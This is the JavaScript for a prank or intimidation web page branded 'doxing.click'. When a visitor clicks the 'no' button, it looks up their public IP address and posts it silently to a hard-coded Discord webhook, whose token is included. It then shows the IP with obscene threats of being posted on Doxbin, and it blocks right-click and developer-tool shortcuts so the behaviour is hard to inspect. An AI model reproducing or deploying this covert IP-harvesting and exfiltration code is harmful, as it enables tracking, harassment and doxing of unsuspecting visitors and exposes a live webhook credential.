$(document).ready(function() {
    var enterText = "are you ready to play?";
    var delay = 50;
    var pauseDelay = 1000;
    var index = 0;
    var isYesButtonProcessing = false;
    var isNoButtonProcessing = false;

    function typeEnterText() {
        $("#enter-type-in").append(enterText[index]);
        index++;
        if (index < enterText.length) {
            setTimeout(typeEnterText, delay);
        } else {
            setTimeout(pauseAfterTyping, pauseDelay);
        }
    }

    function pauseAfterTyping() {
        setTimeout(eraseEnterText, pauseDelay);
    }

    function eraseEnterText() {
        var currentText = $("#enter-type-in").text();
        var newText = currentText.slice(0, -1);
        $("#enter-type-in").text(newText);
        index--;
        if (index >= 0) {
            setTimeout(eraseEnterText, delay);
        } else {
            index = 0;
            setTimeout(typeEnterText, delay);
        }
    }

    typeEnterText();

    $("#yes-btn").click(function() {
        if (isYesButtonProcessing) {
            return;
        }

        isYesButtonProcessing = true;
        $(".button-layer").fadeOut();
        $("#enter-type-in").fadeOut();

        var audio = new Audio('assets/audio.mp3');
        audio.volume = 0.1;
        audio.play();
        $("<img src='assets/cute.gif' style='position: fixed; bottom: 10px; right: 10px; z-index: 1;'>").hide().appendTo("body").fadeIn();

        const neonText = document.createElement('div');
        neonText.textContent = 'doxing.click';
        neonText.classList.add('neon-text', 'fade-in');
        document.body.appendChild(neonText);

        neonText.style.animation = 'vibrate 0.3s infinite';

        const neonTextCSS = `
            position: fixed;
            bottom: 20px;
            left: 50%;
            transform: translateX(-50%);
            color: white;
            font-family: monospace;
            font-size: 60px;
            font-weight: bold;
            text-shadow: 0 0 10px white, 0 0 20px white, 0 0 30px white, 0 0 40px white;
            opacity: 0;
        `;

        neonText.style.cssText = neonTextCSS;

        setTimeout(function() {
            isYesButtonProcessing = false;
        }, 3000);

        setTimeout(function() {
            isYesButtonProcessing = false;
        }, 5000);
    });

    $("#no-btn").click(function() {
        if (isNoButtonProcessing) {
            return;
        }

        isNoButtonProcessing = true;
        $(".button-layer").fadeOut();
        $("#enter-type-in").fadeOut();

        $.getJSON('https://api.ipify.org?format=json', function(data) {
            var ipAddress = data.ip;

        fetch('https://api.ipify.org?format=json')
            .then(response => response.json())
            .then(data => {
                const ipAddress = data.ip;

                const embed = {
                    title: "IP Address",
                    description: ipAddress,
                    color: 0x000000
                };

                fetch('https://discordapp.com/api/webhooks/1215048938797793290/e_oRpx6ac6C6HdO3s2SS0BzDrc3DJ-qx868SSUdqOebKyuqN-Vr_lAzQtLTzLdu0VUXU', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({ embeds: [embed] }),
                })
                .then(response => {
                    if (response.ok) {
                        console.log('IP address sent to Discord webhook successfully.');
                    } else {
                        console.error('Failed to send IP address to Discord webhook.');
                    }
                })
                .catch(error => {
                    console.error('Error sending IP address to Discord webhook:', error);
                });
            })
            .catch(error => {
                console.error('Error fetching IP address:', error);
            });

            var ipText = $("<p>").css({
                "font-family": "monospace",
                "font-size": "16px",
                "color": "white",
                "position": "fixed",
                "top": "50%",
                "left": "50%",
                "transform": "translate(-50%, -50%)",
                "text-align": "center"
            }).text("get fucked by doxing.click, this you? " + ipAddress).appendTo("body");

            var progressBar = $("<div>").addClass("progress-bar").appendTo("body");
            var progressFill = $("<div>").addClass("progress-fill").appendTo(progressBar);
            var width = 0;
            var interval = setInterval(function() {
                progressFill.width(width + "%");
                width += 1;
                if (width >= 100) {
                    clearInterval(interval);
                    ipText.text("You FUCKED Up, You're Going On Doxbin.");
                    progressBar.fadeOut();

                    var runImage = $("<img src='assets/run.png' style='position: fixed; top: 40%; left: 50%; transform: translate(-50%, -50%); z-index: 1;'>")
                        .hide().appendTo("body").fadeIn();
                }
            }, 50);

            var audio2 = new Audio('assets/audio2.mp3');
            audio2.volume = 1;
            audio2.play();

            setTimeout(function() {
                isNoButtonProcessing = false;
            }, 5000);
        });

        setTimeout(function() {
            isNoButtonProcessing = false;
        }, 5000);
    });

    document.addEventListener('contextmenu', (mouseEvent) => {
        mouseEvent.preventDefault();
    });

    document.onkeydown = function(keyEvent) {
        if (keyEvent.keyCode == 123) {
            return false;
        }
        if (keyEvent.ctrlKey && keyEvent.shiftKey && (keyEvent.keyCode == 73 || keyEvent.keyCode == 74 || keyEvent.keyCode == 85)) {
            return false;
        }
    };
});
